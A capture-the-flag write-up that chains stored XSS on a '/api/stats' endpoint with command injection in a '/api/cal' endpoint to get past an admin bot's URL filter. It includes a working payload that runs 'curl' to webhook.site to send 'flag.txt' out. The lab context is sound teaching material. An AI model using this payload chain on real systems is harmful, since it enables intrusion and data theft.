# Description

Does the CLI listen to magic?

http://chal.competitivecyber.club:13336

Flag format: CACI{.*}

# Solution

We are given 2 source files: one for admin bot `admin.js`, which visits a page submitted by the user (only on localhost:1337)
and another app which runs on 1337 port `app.py`. If we look through the source code of admin bot, it sets a secret cookie
for localhost, which is required on the `/api/cal` endpoint in `app.py`. Why is the `/api/cal` endpoint important? Because it
contains command injection

```python
return '{"cal": "'+subprocess.getoutput("cal "+modifier)+'"}'
```

The app applies no filter to the modifier, which is controlled by user. So
if we are able to make call to `/api/cal?modifier=;cat flag.txt`, we can read the flag. However, the call to
`/api/cal` is filtered on the admin bot.

```javascript
if (url.includes("cal") || url.includes("%")) {
    res.send('Error: "cal" is not allowed in the URL');
    return;
}
```

The solution is to use the `/api/stats` endpoint to submit XSS, which when visited will trigger request to `/api/cal` by the admin
browser (and we bypass the filter). Let's create a payload:

```json
{
    "username":"<script>fetch('http://127.0.0.1:1337/api/cal?modifier=;curl https://webhook.site/434bdc29-014d-4da6-bfb7-f6685e89b90d -d $(cat flag.txt)')</script>",

    "high_score":"1234"
}
```

When this payload is executed, it fetches the `/api/cal` and does the command injection to make another request to our domain with the contents of the flag.txt file. If we send this to `/api/stats`, we get back the identifier, which is then passed to the admin bot to visit. After he visits the URL, XSS gets triggered and we get the flag. 